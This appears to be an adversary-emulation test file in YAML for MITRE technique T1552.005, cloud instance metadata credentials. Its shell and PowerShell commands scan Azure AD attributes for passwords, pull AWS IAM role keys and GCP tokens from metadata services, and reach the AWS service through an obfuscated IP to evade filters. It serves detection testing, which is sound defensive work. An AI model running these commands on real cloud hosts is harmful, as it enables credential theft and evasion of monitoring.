attack_technique: T1552.005
display_name: "Unsecured Credentials: Cloud Instance Metadata API"
atomic_tests:
- name: Azure - Search Azure AD User Attributes for Passwords
  auto_generated_guid: ae9b2e3e-efa1-4483-86e2-fae529ab9fb6
  description: |
    This test uses the MSOnline Powershell module to retrieve all user attributes for a specified account, which can sometimes contain unsecured credentials. 
    Upon successful execution, this test will scan all user attributes for any strings containing "password".
    Those unsecured credentials will be output to a text file, as well as the account that they are associated with and the user attribute in which they were found. 
    See: https://github.com/dafthack/CloudPentestCheatsheets/blob/master/cheatsheets/Azure.md
  supported_platforms:
  - azure-ad
  input_arguments:
    username:
      description: Azure AD username
      type: string
      default:
    password:
      description: Azure AD password
      type: string
      default: T1082Az
  dependency_executor_name: powershell
  dependencies:
  - description: |
      The MSOnline module must be installed.
    prereq_command: |
      if (get-command Get-MsolUser -erroraction silentlycontinue){exit 0} else {exit 1}
    get_prereq_command: |
      install-module MSOnline
  executor:
    command: |
      import-module msonline
      $Password = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Password
      Connect-MsolService -Credential $Credential
      $users = Get-MsolUser -All;
      foreach($user in $users)
      {$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; 
      foreach($prop in $props)
      {if($user.$prop -like "*password*")
      {("[*]" + $user.UserPrincipalName + "[" + $prop + "]" + " : " + $user.$prop) | out-file -filepath $env:temp\T1552.005Test1.txt -append -force}}}
      get-content -path $env:temp\T1552.005Test1.txt -erroraction silentlycontinue
    cleanup_command: |
      remove-item $env:temp\T1552.005Test1.txt -force -erroraction silentlycontinue
    name: powershell
    elevation_required: true
- name: Azure - Dump Azure Instance Metadata from Virtual Machines
  auto_generated_guid: cc99e772-4e18-4f1f-b422-c5cdd1bfd7b7
  description: |
    This test invokes a web request to the default Instance Metadata API of 169.254.169.254 in order to dump the data contained within it to a file. 
    See: https://www.sans.org/blog/cloud-instance-metadata-services-imds-/
  supported_platforms:
  - iaas:azure
  input_arguments:
    output_file:
      description: File to output metadata to
      type: string
      default: $env:temp\T1552.005Test2.txt
  executor:
    command: |
      Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | ConvertTo-Json -Depth 64 > #{output_file}
    cleanup_command: |
      remove-item #{output_file} -force -erroraction silentlycontinue
    name: powershell
- name: AWS - Retrieve EC2 IAM Role Credentials via IMDSv2
  auto_generated_guid: c9aa1ca4-04df-4623-adac-1f199ca5ce42
  description: |
    Simulates an adversary on a compromised EC2 instance abusing the Instance Metadata Service Version 2
    (IMDSv2) to steal the temporary IAM role credentials assigned to the instance. A session token is first
    requested with a PUT to `/latest/api/token`, then supplied in the `X-aws-ec2-metadata-token` header to
    read the instance's IAM role name and retrieve that role's `AccessKeyId`, `SecretAccessKey`, and `Token`
    from `/latest/meta-data/iam/security-credentials/`. The harvested credentials are written to a file.
    On a host that is not an EC2 instance the requests to the link-local 169.254.169.254 address time out and
    no credentials are returned.
    See: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-metadata-v2-how-it-works.html
  supported_platforms:
  - linux
  - iaas:aws
  input_arguments:
    metadata_endpoint:
      description: Base URL of the EC2 Instance Metadata Service
      type: string
      default: http://169.254.169.254
    token_ttl:
      description: TTL in seconds requested for the IMDSv2 session token
      type: integer
      default: 21600
    output_file:
      description: File the harvested IAM role credentials are written to
      type: path
      default: /tmp/T1552.005_aws_imds_creds.json
  dependency_executor_name: sh
  dependencies:
  - description: |
      curl must be installed.
    prereq_command: |
      if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
    get_prereq_command: |
      if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y curl; fi
      if grep -iq "rhel\|fedora\|centos\|rocky\|alma" /usr/lib/os-release; then yum install -y curl; fi
  executor:
    command: |
      token=$(curl -s --connect-timeout 2 -m 5 -X PUT "#{metadata_endpoint}/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: #{token_ttl}")
      role=$(curl -s --connect-timeout 2 -m 5 -H "X-aws-ec2-metadata-token: $token" "#{metadata_endpoint}/latest/meta-data/iam/security-credentials/")
      curl -s --connect-timeout 2 -m 5 -H "X-aws-ec2-metadata-token: $token" "#{metadata_endpoint}/latest/meta-data/iam/security-credentials/$role" -o "#{output_file}"
      if [ -s "#{output_file}" ]; then cat "#{output_file}"; else echo "No IAM credentials returned (host is not an EC2 instance with an attached role)"; fi
    cleanup_command: |
      rm -f "#{output_file}"
    name: sh
    elevation_required: false
- name: AWS - Retrieve EC2 IAM Role Credentials via IMDSv1
  description: |
    Simulates an adversary with a shell on a compromised EC2 instance abusing the Instance Metadata Service
    Version 1 (IMDSv1) to steal the temporary IAM role credentials assigned to the instance. IMDSv1 needs no
    session token: a plain GET to `/latest/meta-data/iam/security-credentials/` returns the role name, and a
    second GET to that path plus the role name returns its `AccessKeyId`, `SecretAccessKey`, and `Token`.
    The harvested credentials are written to a file. On a host that is not an EC2 instance, or on one that
    enforces IMDSv2, the requests time out or fail and no credentials are returned.
    Cryptomining campaigns such as TeamTNT have been reported searching for credentials exposed through the AWS
    metadata service.
    See: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html
    and https://www.trendmicro.com/en_au/research/21/c/teamtnt-continues-attack-on-the-cloud--targets-aws-credentials.html
  supported_platforms:
  - linux
  - iaas:aws
  input_arguments:
    metadata_endpoint:
      description: Base URL of the EC2 Instance Metadata Service
      type: string
      default: http://169.254.169.254
    output_file:
      description: File the harvested IAM role credentials are written to
      type: path
      default: /tmp/T1552.005_aws_imdsv1_creds.json
  dependency_executor_name: sh
  dependencies:
  - description: |
      curl must be installed.
    prereq_command: |
      if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
    get_prereq_command: |
      if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y curl; fi
      if grep -iq "rhel\|fedora\|centos\|rocky\|alma" /usr/lib/os-release; then yum install -y curl; fi
  executor:
    command: |
      role=$(curl -sf --connect-timeout 2 -m 5 "#{metadata_endpoint}/latest/meta-data/iam/security-credentials/")
      if [ -n "$role" ]; then curl -sf --connect-timeout 2 -m 5 "#{metadata_endpoint}/latest/meta-data/iam/security-credentials/$role" -o "#{output_file}"; fi
      if [ -s "#{output_file}" ]; then cat "#{output_file}"; else echo "No IAM credentials returned (host is not an EC2 instance with an attached role, or IMDSv2 is required)"; fi
    cleanup_command: |
      rm -f "#{output_file}"
    name: sh
    elevation_required: false
- name: AWS - Query the instance metadata service using an obfuscated IP address
  description: |
    Requests the IAM role name from the cloud instance metadata service using an alternative notation of the
    link-local address 169.254.169.254 instead of the dotted-decimal form. Adversaries use these forms to evade
    detections and filters that match only the literal address. curl (through libc and its own parser) accepts a
    single decimal integer (`2852039166`), a hexadecimal integer (`0xA9FEA9FE`) and dotted octal
    (`0251.0376.0251.0376`), and all of them connect to 169.254.169.254.
    Only the role name listing is requested, not the credentials themselves. On a host that is not a cloud
    instance the request times out and nothing is returned.
    See: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html
  supported_platforms:
  - linux
  - iaas:aws
  input_arguments:
    metadata_address:
      description: |
        Address of the metadata service in an alternative notation. Equivalent values: 2852039166,
        0xA9FEA9FE, 0251.0376.0251.0376.
      type: string
      default: "2852039166"
    output_file:
      description: File the response is written to
      type: path
      default: /tmp/T1552.005_imds_obfuscated.txt
  dependency_executor_name: sh
  dependencies:
  - description: |
      curl must be installed.
    prereq_command: |
      if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
    get_prereq_command: |
      if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y curl; fi
      if grep -iq "rhel\|fedora\|centos\|rocky\|alma" /usr/lib/os-release; then yum install -y curl; fi
  executor:
    command: |
      curl -sf --connect-timeout 2 -m 5 "http://#{metadata_address}/latest/meta-data/iam/security-credentials/" -o "#{output_file}"
      if [ -s "#{output_file}" ]; then cat "#{output_file}"; else echo "No response (host is not a cloud instance with an attached role)"; fi
    cleanup_command: |
      rm -f "#{output_file}"
    name: sh
    elevation_required: false
- name: GCP - Retrieve the service account access token from the metadata server
  description: |
    Simulates an adversary with a shell on a compromised Google Compute Engine instance requesting the OAuth
    access token of the instance's default service account from the metadata server. The server requires the
    header `Metadata-Flavor: Google`; the request is a plain GET to
    `/computeMetadata/v1/instance/service-accounts/default/token`. The response is written to a file. On a host
    that is not a Compute Engine instance the request fails to resolve or times out and no token is returned.
    See: https://github.com/googleapis/google-auth-library-python/blob/cd52a08d378d7c41ff63fc685f7cdbd4eb45885c/google/auth/compute_engine/_metadata.py
  supported_platforms:
  - linux
  - iaas:gcp
  input_arguments:
    metadata_endpoint:
      description: Base URL of the Compute Engine metadata server
      type: string
      default: http://metadata.google.internal
    output_file:
      description: File the access token response is written to
      type: path
      default: /tmp/T1552.005_gcp_sa_token.json
  dependency_executor_name: sh
  dependencies:
  - description: |
      curl must be installed.
    prereq_command: |
      if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
    get_prereq_command: |
      if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y curl; fi
      if grep -iq "rhel\|fedora\|centos\|rocky\|alma" /usr/lib/os-release; then yum install -y curl; fi
  executor:
    command: |
      curl -sf --connect-timeout 2 -m 5 -H "Metadata-Flavor: Google" "#{metadata_endpoint}/computeMetadata/v1/instance/service-accounts/default/token" -o "#{output_file}"
      if [ -s "#{output_file}" ]; then cat "#{output_file}"; else echo "No token returned (host is not a Compute Engine instance with a service account)"; fi
    cleanup_command: |
      rm -f "#{output_file}"
    name: sh
    elevation_required: false
